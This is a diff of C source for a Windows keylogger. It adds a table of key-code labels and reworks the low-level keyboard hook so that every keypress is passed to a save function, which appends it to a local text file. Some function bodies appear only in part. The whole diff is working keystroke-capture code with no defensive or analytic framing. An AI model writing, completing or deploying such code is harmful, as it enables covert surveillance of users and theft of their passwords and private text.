@@ -1,8 +1,104 @@
 #include "keylogger.h"
 
-static HINSTANCE hinst;
+///static HINSTANCE hinst;
 static HHOOK handlekeyboard = NULL;
 
+const struct keyboard keyboard[] =
+{
+	{ VK_BACK, "[BACK]" },
+	{ VK_TAB, "[TAB]" },
+	{ VK_CLEAR, "[CLR]" },
+	{ VK_RETURN, "[ENTER]" },
+	{ VK_SHIFT, "[SHIFT]" },
+	{ VK_CONTROL, "[CTRL]" },
+	{ VK_MENU, "[ALT]" },
+	{ VK_CAPITAL, "[CAPS LOCK]" },
+	{ VK_ESCAPE, "[ESC]" },
+	{ VK_SPACE, "[SPACE]" },
+	{ VK_PRIOR, "[PGUP]" },
+	{ VK_NEXT, "[PGDW]" },
+	{ VK_END, "[END]" },
+	{ VK_HOME, "[HOME]" },
+	{ VK_LEFT, "[LEFT]" },
+	{ VK_UP, "[UP]" },
+	{ VK_RIGHT, "[RIGHT]" },
+	{ VK_DOWN, "[DOWN]" },
+	{ VK_SNAPSHOT, "[PRTSCRN]" },
+	{ VK_INSERT, "[insert]" },
+	{ VK_DELETE, "[DEL]" },
+	{ 0x30, "0" },
+	{ 0x31, "1" },
+	{ 0x32, "2" },
+	{ 0x33, "3" },
+	{ 0x34, "4" },
+	{ 0x35, "5" },
+	{ 0x36, "6" },
+	{ 0x37, "7" },
+	{ 0x38, "8" },
+	{ 0x39, "9" },
+	{ 0x41, "A" },
+	{ 0x42, "B" },
+	{ 0x43, "C" },
+	{ 0x44, "D" },
+	{ 0x45, "E" },
+	{ 0x46, "F" },
+	{ 0x47, "G" },
+	{ 0x48, "H" },
+	{ 0x49, "I" },
+	{ 0x4A, "J" },
+	{ 0x4B, "K" },
+	{ 0x4C, "L" },
+	{ 0x4D, "M" },
+	{ 0x4E, "N" },
+	{ 0x4F, "O" },
+	{ 0x50, "P" },
+	{ 0x51, "Q" },
+	{ 0x52, "R" },
+	{ 0x53, "S" },
+	{ 0x54, "T" },
+	{ 0x55, "U" },
+	{ 0x56, "V" },
+	{ 0x57, "W" },
+	{ 0x58, "X" },
+	{ 0x59, "Y" },
+	{ 0x5A, "Z" },
+	{ VK_NUMPAD0, "0" },
+	{ VK_NUMPAD1, "1" },
+	{ VK_NUMPAD2, "2" },
+	{ VK_NUMPAD3, "3" },
+	{ VK_NUMPAD4, "4" },
+	{ VK_NUMPAD5, "5" },
+	{ VK_NUMPAD6, "6" },
+	{ VK_NUMPAD7, "7" },
+	{ VK_NUMPAD8, "8" },
+	{ VK_NUMPAD9, "9" },
+	{ VK_LCONTROL, "[CTRL]" },
+	{ VK_RCONTROL, "[CTRL]" },
+	{ VK_LSHIFT, "[SHIFT]" },
+	{ VK_RSHIFT, "[SHIFT]" },
+	{ VK_OEM_2, "[~]" },
+	{ VK_NUMLOCK, "[NUMLOCK]" },
+	{ VK_DIVIDE, "[/]" },
+	{ VK_MULTIPLY, "[*]" },
+	{ VK_ADD, "[+]" },
+	{ VK_SUBTRACT, "-" },
+	{ VK_DECIMAL, "[.]" },
+	{ VK_F1, "[f1]" },
+	{ VK_F2, "[f2]" },
+	{ VK_F3, "[f3]" },
+	{ VK_F4, "[f4]" },
+	{ VK_F5, "[f5]" },
+	{ VK_F6, "[f6]" },
+	{ VK_F7, "[f7]" },
+	{ VK_F8, "[f8]" },
+	{ VK_F9, "[f9]" },
+	{ VK_F10, "[f10]" },
+	{ VK_F11, "[f11]" },
+	{ VK_F12, "[f12]" },
+	{ VK_LWIN, "[WIN]" },
+	{ VK_RWIN, "[WIN]" },
+	{ 0, NULL }
+};
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
 	LPKBDLLHOOKSTRUCT kb;
@@ -16,18 +112,14 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 	LPKBDLLHOOKSTRUCT kb;
 	size_t			  i = 0;
 	kb = (LPKBDLLHOOKSTRUCT)lparam;
-	if (kb->vkCode >= 65 && kb->vkCode <= 90 && wparam == WM_KEYDOWN)
-		printf("%c\n", (char)kb->vkCode);
-	else
+	for (i = 0; keyboard[i].code != kb->vkCode && keyboard[i].code != 0; i++);
+	if (wparam == WM_KEYDOWN)
 	{
-		for (i = 0; keyboard[i].code != kb->vkCode && keyboard[i].code != 0; i++);
-		if (wparam == WM_KEYDOWN)
-			printf("%s %u\n", keyboard[i].character, kb->vkCode);
+		save_data(keyboard[i].character);
+		printf("%s %zu\n", keyboard[i].character, strlen(keyboard[i].character));
 	}
 	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
 }
-
-
 
 void	setwinhook()
 {
@@ -46,7 +138,7 @@ void	setwinhook()
 	CloseHandle(process.hThread);
 }
 
-void	save_data(const char data)
+void	save_data(const char *data)
 {
 	static int nbChar;
 
@@ -64,14 +156,13 @@ void	save_data(const char data)
 	elapseTime = difftime(timet2, timet1);
 
 	printf( "Time : %f\n", countTime);
-
 	*/
 
 	FILE *file;
 	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
 		_wperror(L" Open file failed ");
 
-	_write(_fileno(file), &data, 1);
+	_write(_fileno(file), data, strlen(data));
 
 	if (nbChar == 61)
 	{
@@ -94,11 +185,6 @@ void	save_data(const char data)
 int	main(void)
 {
 	MSG msg;
-
-	for (int i = 0; i < 121; i++)
-	{
-		save_data('c');
-	}
 
 	setwinhook();				
 	while (GetMessage(&msg, NULL, 0, 0))
